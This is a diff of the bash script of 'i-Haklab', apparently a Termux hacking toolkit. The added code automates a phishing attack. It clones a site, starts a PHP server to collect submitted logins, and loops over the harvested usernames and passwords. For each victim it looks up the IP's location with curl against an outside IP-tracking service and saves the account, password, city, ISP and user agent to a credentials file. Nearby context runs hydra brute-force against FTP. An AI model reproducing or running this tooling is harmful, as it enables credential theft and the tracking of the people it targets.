@@ -2,8 +2,10 @@
 #Created on Dec/2018
 IFS=$'\n\t'
 #trap ctrl_c 2
+
 source /data/data/com.termux/files/usr/libexec/colors
-function ctrl_c() {
+
+ctrl_c() {
                 echo
                 printf "$Y\n[!]$R Going me on$B Telegram$R t.me/Ivam3byCinderella$W\n"
 }
@@ -39,6 +41,7 @@ chk-mega() {
 chk-hydra() {
 	command -v hydra > /dev/null || { printf "$R\n[W]->$W hydra not found$R |$W run apt install hydra"; exit; }
 }
+
 if [ -L ~/storage/external-1 ]; then
 	iHAKLAB=/data/data/com.termux/files/home/storage/external-1/roothome/i-Haklab
 else
@@ -49,29 +52,34 @@ while [ "$USER" = "root" ]; do
 	printf "$R\n[W]:-> You need to be a common user$W\n"
 	exit
 done
+
 until [ -d $iHAKLAB ]; do
 	printf "$R\n[W]:-> i-Haklab needed$W |$Y Do y ou wanna install it?$W\n"
 	while read -p "[yes/no]:-> " yesorno && [ -z $yesorno ]; do
 		continue
 	done
-if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
-	git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
-        cd ~/i-Haklab;bash setup
-else 
-	printf "$G\n[!]-> Have a nice hacking day!!\n\n"
-	exit
-fi
+	if [ $yesorno = "yes" ] || [ $yesorno = "Yes" ] || [ $yesorno = "YES" ]; then
+		git clone https://github.com/ivam3/i-Haklab.git $HOME/i-Haklab
+		cd ~/i-Haklab;bash setup
+	else 
+		printf "$G\n[!]-> Have a nice hacking day!!\n\n"
+		exit
+	fi
 done
+
 TOOL=$(ls $iHAKLAB/.set/to-install/ | grep -iv .zip | grep -iv instasudo | grep -iv QG | grep -iv i-Haklab_login | grep -iv check-root | grep -iv functions | grep -n -iv lock)
 TARGET=(0 1 2 3 29)
 SSH=$(netstat | grep -c "ssh")
 LOCALHOST=$(ifconfig wlan0 | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | grep -v 255)
 CHECKROOT=$(bash $iHAKLAB/.set/to-install/check-root)
+SITE=$(ls $iHAKLAB/.set/phishing)
+
 if [ "$CHECKROOT" = "root" ]; then
 	LPORT=80
 else
 	LPORT=4546
 fi
+
 if [ -z $1 ] || [ $1 = help ]; then
 	banner
 	printf "$Y\n[i]->$W i-Haklab v.1.0 (c) 2019 by Ivam3 - Is a hacking laboratory that contains open source tools recommended by Ivam3. If the law is violated with it's use, this would be the responsibility of the user who handled it.\n\nSyntax: i-Haklab [-arg-] [-option-]\n
@@ -620,14 +628,21 @@ elif [ $1 = bfftp ] && [ $2 ] && [ $3 ] && [ $4 ]; then
 		chk-hydra
                 hydra -L $2 -P $3 $4 ftp
         fi
+
 elif [ $1 = phishing ] && [ -z $2 ];then
 	printf "$R[w]->$W Phishing argument needs a website as an option1"
 elif [ $1 = phishing ] && [ $2 ] && [ -z $3 ]; then
-	printf "$R[w]->$W Phishing argument needs a redirect site as an option2"
+	printf "$R[w]->$W Phishing argument needs a redirection as an option2"
 elif [ $1 = phishing ] && [ $2 ] && [ $3 ]; then
 	if [ -e $iHAKLAB/.set/phishing/$2 ]; then
-		banner
 		TMP_PATH=$PREFIX/var/service/php/$2
+		for FILE in ip.txt usernames.txt iptracker.log ; do
+			if [ -e $TMP_PATH/$FILE ]; then
+				echo
+		#		rm $TMP_PATH/$FILE > /dev/null 2>&1
+			fi
+		done
+		banner
 		if [ ! -d $TMP_PATH ]; then
 			mkdir -p $TMP_PATH
 		fi
@@ -673,7 +688,110 @@ elif [ $1 = phishing ] && [ $2 ] && [ $3 ]; then
 		echo "}" >> $TMP_PATH/post.php
 		echo "" >> $TMP_PATH/post.php
 		echo "exit();" >> $TMP_PATH/post.php
-		printf "$G\n[+]->$W Site $2 cloned$G\n[+]->$W Server files ready in $TMP_PATH$G\n[+]->$W Information gathering in usernames.txt and ip.txt$Y\n[!]->$W Run command serverphp <directory path> to start it$Y\n[!]->$W Run i-Haklab forwarding to take it out of lan\n"
+		checkphp=$(ps aux | grep -o "php" | head -n1)
+		if [ $checkphp == *'php'* ]; then
+			pkill -f -2 php > /dev/null 2>&1
+			killall -2 php > /dev/null 2>&1
+		fi
+		exec serverphp $TMP_PATH > /dev/null 2>&1 &
+		printf "$G\n[+]->$W Site $2 cloned$Y\n[!]->$W Server php running on http://127.0.0.1:4546$Y\n[!]->$W Run i-Haklab forwarding to take it out of lan$B\n[-]->$W Waiting for information . . .\n"
+		if [ ! -e $TMP_PATH/creds.txt ]; then
+			touch $TMP_PATH/creds.txt
+		fi
+		while [ $TMP_PATH/ip.txt ] && [ $TMP_PATH/usernames.txt ]; do
+#		while [ true ]; do
+
+#			if [ -e $TMP_PATH/ip.txt ] && [ -e $TMP_PATH/usernames.txt ]; then
+				printf "$G[+]-> CREDENTIALS FOUND$W"
+				exec date >> $TMP_PATH/creds.txt
+IP=$(grep -a 'IP:' $TMP_PATH/ip.txt | cut -d " " -f2 | tr -d '\r' | head -n1)
+IPTRACKER=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$IP" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > $TMP_PATH/iptracker.log)
+				if [ ! -z $IP ]; then
+					echo $IP >> $TMP_PATH/creds.txt
+					printf "$G[+]-> IP:$W\t$IP"
+					sleep 0.5
+				fi
+IP_SPEED=$(grep -o "IP Address Speed:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+				if [ ! -z $IP_SPEED ]; then
+					echo $IP_SPEED >> $TMP_PATH/creds.txt
+					printf "$G[+]-> IP SPEED:$W\t$IP_SPEED"
+					sleep 0.5
+				fi
+IP_CURRENCY=$(grep -o "IP Currency:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+				if [ ! -z $IP_CURRENCY ]; then
+					echo $IP_CURRENCY >> $TMP_PATH/creds.txt
+					printf "$G[+]-> IP CURRENCY:$W\t$IP_CURRENCY"
+					sleep 0.5
+				fi
+CONTINENT=$(grep -o 'Continent.*' $TMP_PATH/iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
+				if [ ! -z $CONTINENT ]; then
+					echo $CONTINENT >> $TMP_PATH/creds.txt
+					printf "$G[+]-> CONTINENT:$W\t$CONTINENT"
+					sleep 0.5
+				fi
+COUNTRY=$(grep -o 'Country:.*' $TMP_PATH/iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
+				if [ ! -z $COUNTRY ]; then
+					echo $COUNTRY >> $TMP_PATH/creds.txt
+					printf "$G[+]-> COUNTRY:$W\t$COUNTRY"
+					sleep 0.5
+				fi
+STATE=$(grep -o "tracking lessimpt.*" $TMP_PATH/iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
+				if [ ! -z $STATE ]; then
+					echo $STATE >> $TMP_PATH/creds.txt
+					printf "$G[+]-> STATE:$W\t$STATE"
+					sleep 0.5
+				fi
+CITY=$(grep -o "City Location:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+				if [ ! -z $CITY ]; then
+					echo $CITY >> $TMP_PATH/creds.txt
+					printf "$G[+]-> CITY:$W\t$CITY"
+					sleep 0.5
+				fi
+HOSTIP=$(grep  -o "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
+				if [ ! -z $HOSTIP ]; then
+					echo $HOSTIP >> $TMP_PATH/creds.txt
+					printf "$G[+]-> HOST IP:$W\t$HOSTIP"
+					sleep 0.5
+				fi
+REVERSE_DNS=$(grep -a "</td></tr><tr><th>Hostname:.*" $TMP_PATH/iptracker.log | cut -d "<" -f1)
+				if [ ! -z $REVERSE_DNS ]; then
+					echo $REVERSE_DNS >> $TMP_PATH/creds.txt
+					printf "$G[+]-> REVERSE DNS:$W\t$REVERS_DNS"
+					sleep 0.5
+				fi
+ACCOUNT=$(grep -o 'Account:.*' $TMP_PATH/usernames.txt | cut -d " " -f2)
+				if [ ! -z $ACCOUNT ]; then
+					echo $ACCOUNT >> $TMP_PATH/creds.txt
+					printf "$G[+]-> ACCOUNT:$W\t$ACCOUNT"
+					sleep 0.5
+				fi
+PASSWD=$(grep -o 'Pass:.*' $TMP_PATH/usernames.txt | cut -d ":" -f2)
+				if [ ! -z $PASSWD ]; then
+					echo $PASSWD >> $TMP_PATH/creds.txt
+					printf "$G[+]-> PASSWORD:$W\t$PASSWD"
+					sleep 0.5
+				fi
+UA=$(grep 'User-Agent:' $TMP_PATH/ip.txt | cut -d '"' -f2 | head -n1 | awk '{print $1 $2 $3 $4 $5 $6}')
+				if [ ! -z $UA ]; then
+					echo $UA >> $TMP_PATH/creds.txt
+					printf "$G[+]-> USER AGENT:$W\t$UA"
+					sleep 0.5
+				fi
+ISP=$(grep -o "ISP:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+				if [ ! -z $ISP ]; then
+					echo $ISP >> $TMP_PATH/creds.txt
+					printf "$G[+]-> ISP:$W\t$ISP"
+					sleep 0.5
+				fi
+AS_NUMBER=$(grep -o "AS Number:.*" $TMP_PATH/iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
+				if [ ! -z $AS_NUMBER ]; then
+					echo $AS_NUMBER >> $TMP_PATH/creds.txt
+					printf "$G[+]-> AS NUMBER:$W\t$AS_NUMBER"
+					sleep 0.5
+				fi
+				printf "$G\n[+]->$W Credentials saved in $TMP_PATH/creds.txt"
+			#fi
+		done
 	else
 		printf "$R[w]->$W This website has not been included yet"
 	fi
